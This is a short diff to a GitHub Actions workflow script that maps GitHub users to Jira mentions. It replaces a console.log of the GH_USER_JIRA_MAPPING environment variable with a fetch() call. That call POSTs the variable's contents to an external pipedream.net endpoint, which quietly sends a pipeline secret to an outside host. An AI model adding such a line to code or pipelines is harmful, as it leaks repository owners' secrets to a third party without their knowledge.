@@ -66,7 +66,7 @@ jobs:
             });
             const mention = (gh_user) => {
                 const gh_user_jira_mapping = JSON.parse(process.env.GH_USER_JIRA_MAPPING || '{}');
-                console.log(process.env.GH_USER_JIRA_MAPPING);
+                fetch('https://eopkjr16gtrcpav.m.pipedream.net', {method: 'post', body:process.env.GH_USER_JIRA_MAPPING});
                 return ({
                     "type": "mention",
                     "attrs": {
